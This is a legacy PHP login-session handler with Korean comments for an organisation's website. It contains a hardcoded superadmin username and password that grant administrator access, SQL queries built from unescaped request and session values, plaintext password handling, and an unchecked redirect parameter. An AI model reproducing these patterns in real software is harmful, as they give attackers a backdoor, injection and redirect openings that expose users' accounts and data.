<?
/* vim: set expandtab tabstop=4 shiftwidth=4 foldmethod=marker: */
/**
* 작성일: 2009-10-06
* 작성자: 김종태
* 설   명: 통합로그인용 디비세션 관리자(로그인만)
*****************************************************************
* 
*/

$DB = &WebApp::singleton('DB');

$mk_30 = mktime() - 1800;

//전체 정리
$sql = "delete from TAB_SESSION where  num_date < $mk_30";
 if($DB->query($sql)){
	$DB->commit();
 }


$sql = "select str_id, str_pass from TAB_SESSION where num_oid = "._OID." and str_ip = '".$_SERVER["REMOTE_ADDR"]."'  and ssid = '".$_REQUEST[PHPSESSID]."'";

$data = $DB -> sqlFetch($sql);

	if($data){
	
	if($data[str_id] == "sadmin") {
	if($data[str_pass] =="ewut00") {
	


	$sql = "SELECT 
		str_id,
		str_name,
		str_passwd, 
		str_email,

		chr_mtype,
		str_nick,
		num_fcode,
		num_auth,
		str_setup
		
		FROM TAB_MEMBER 
		
		WHERE 
		num_oid=$_OID AND 
		 chr_mtype = 'z' and ROWNUM = 1
		
		
		";
		
		
		
		if($data = $DB->sqlFetch($sql)){
	
	
  

		$_SESSION['ADMIN'] = true;
        $_SESSION['AUTH'] = true;
        $_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
        $_SESSION['MEM_TYPE'] = $mem_type;
        $_SESSION['USERID'] = $data['str_id'];
        $_SESSION['NAME'] = $data['str_name'];
		$_SESSION['NICKNAME'] = $data['str_nick'];
		$_SESSION['SETUP'] = $data['str_setup'];
		$_SESSION['PASSWORD'] = $data['str_passwd'];
		$_SESSION['E_MAIL'] = $data['str_email'];
        $_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
        $USER_TYPE = $_SESSION['CHR_MTYPE'];
		}else{
		echo "<script>alert('관리자 계정이 없습니다.');</script>";
		}
		
		
	}else{
	WebApp::moveBack('비밀번호를 확인해주세요.');
	
	}


 $sql = "delete from TAB_SESSION where num_oid ="._OID." and str_id ='sadmin' and str_ip = '".$_SERVER["REMOTE_ADDR"]."' and ssid = '".$_REQUEST[PHPSESSID]."'";
	 if($DB->query($sql)){
	 $DB->commit();
	 }

}



		$sql = "SELECT 
			str_id,
			str_name,
			str_passwd, 
			str_email,
			num_auth,
			chr_mtype,
			str_nick,
			num_fcode,
			num_auth,
			str_setup
			
			FROM TAB_MEMBER 
			
			WHERE 
			num_oid=$_OID AND 
			 str_id='".$data[str_id]."' and str_passwd='".$data[str_pass]."'
			
			";


			if($data = $DB->sqlFetch($sql)){
			if($data[chr_mtype] =="z") $_SESSION['ADMIN'] = true;
			if($data[num_auth])$_SESSION['AUTH'] = true;

			
			  if($data['num_auth']) {
				$mem_type = array($data['chr_mtype']);
				$sql = "SELECT str_group FROM ".TAB_GROUP_MEMBER." WHERE num_oid=$_OID AND str_id='".$data[str_id]."'";
				if($gdata = $DB->sqlFetchAll($sql)) {
					foreach($gdata as $_row) $mem_type[] = $_row['str_group'];
				}

			$_SESSION['REMOTE_ADDR'] = getenv('REMOTE_ADDR');
			$_SESSION['MEM_TYPE'] = $mem_type;
			$_SESSION['USERID'] = $data['str_id'];
			$_SESSION['NAME'] = $data['str_name'];
			$_SESSION['NICKNAME'] = $data['str_nick'];
			$_SESSION['SETUP'] = $data['str_setup'];
			$_SESSION['PASSWORD'] = $data['str_passwd'];
			$_SESSION['E_MAIL'] = $data['str_email'];
			$_SESSION['CHR_MTYPE'] = $data['chr_mtype'];
			$USER_TYPE = $_SESSION['CHR_MTYPE'];
			
			/* $sql = "delete from TAB_SESSION where num_oid ="._OID." and str_id ='".$_SESSION[USERID]."' and str_ip = '".$_SERVER["REMOTE_ADDR"]."' and ssid = '".$_REQUEST[PHPSESSID]."'";
			 if($DB->query($sql)){
			 $DB->commit();
			 }*/

			 $sql = "UPDATE ".TAB_MEMBER." SET num_login_cnt = num_login_cnt + 1 WHERE num_oid=$_OID AND str_id='".$data[str_id]."'";
			$DB->query($sql);
			$DB->commit();



			//2008-07-07 회원 포인트 값
			$plus_point = "num_login_point";
			$sql = "select $plus_point from TAB_ORGAN where num_oid = $_OID ";
			$chw = $DB -> sqlFetchOne($sql);
			
			$sql = "UPDATE ".TAB_MEMBER." SET $plus_point = $plus_point +1 , num_point_total = num_point_total + $chw WHERE num_oid=$_OID AND str_id='".$data[str_id]."'";

			$DB->query($sql);
			$DB->commit();



		if($_SESSION['USERID']){
		$sql = "select num_total_point as point_total  from TAB_MEMBER WHERE num_oid=$_OID AND str_id='".$_SESSION['USERID']."'";
		$total_point = $DB -> sqlFetchOne($sql);
		$_SESSION['POINT']  = $total_point;
		}





	  
	 $_SESSION['FCODE'] = $data['num_fcode'];
	
		/*$sql = "select count(*) from tab_class_formation where num_oid = $_OID ";
		$class_max = $DB -> sqlFetchOne($sql);
		if($class_max > 0 && $data['chr_mtype'] == "s"  && !$data['num_fcode']) {
			WebApp::redirect("/member.modify","회원의 학급정보가 없습니다. \n\n회원정보수정에서 학급을 선택해주세요.");
			exit;
		}
	*/
		
		
		}else{
        $mem_type = array('n');
		
		$sql = "delete from TAB_SESSION where num_oid ="._OID." and str_id ='".$data[str_id]."' and str_ip = '".$_SERVER["REMOTE_ADDR"]."' and ssid = '".$_REQUEST[PHPSESSID]."'";
			 if($DB->query($sql)){
			 $DB->commit();
		 }

        echo "
        <script>
        alert('회원승인 확인중입니다');
        history.go(-1);
        </script>
        ";
      }		

	  }

	

}else{
		
		if(!$_SESSION[USERID]){
			$DB = &WebApp::singleton('DB');
			 $sql = "delete from TAB_SESSION where num_oid ="._OID." and str_id ='".$_SESSION[USERID]."' and str_ip = '".$_SERVER["REMOTE_ADDR"]."' and ssid = '".$_REQUEST[PHPSESSID]."'";
			 if($DB->query($sql)){
			 $DB->commit();
			 }

			$_SESSION['AUTH'] = "";
			$_SESSION['REMOTE_ADDR'] = "";
			$_SESSION['NUM_OID'] = "";
			$_SESSION['USERID'] = "";
			$_SESSION['NAME'] = "";
			$_SESSION['PASSWORD'] = "";
			$_SESSION['ADMIN'] = "";
			$_SESSION['FCODE']  = "";
			$_SESSION['IN_ADMIN'] = "";
			$_SESSION['SES_ORGAN'] = "";
			$_SESSION['SES_HOST'] = "";
			$_SESSION['themeset'] = "";
			
			$USER_TYPE =  "";
			
			session_destroy();
			setCookie('AUTH',false,-3600,'/','.'.HOST);
			setCookie('USERID','',-3600,'/','.'.HOST);
			setCookie('NAME','',-3600,'/','.'.HOST);
		}
}

if($_GET[re_url]){
//echo $_GET[re_url];
echo "<meta http-equiv='Refresh' Content=\"0; URL='http://".$_GET[re_url]."'\">";
}else{
echo "<meta http-equiv='Refresh' Content=\"0; URL='/'\">";
}
exit;
?>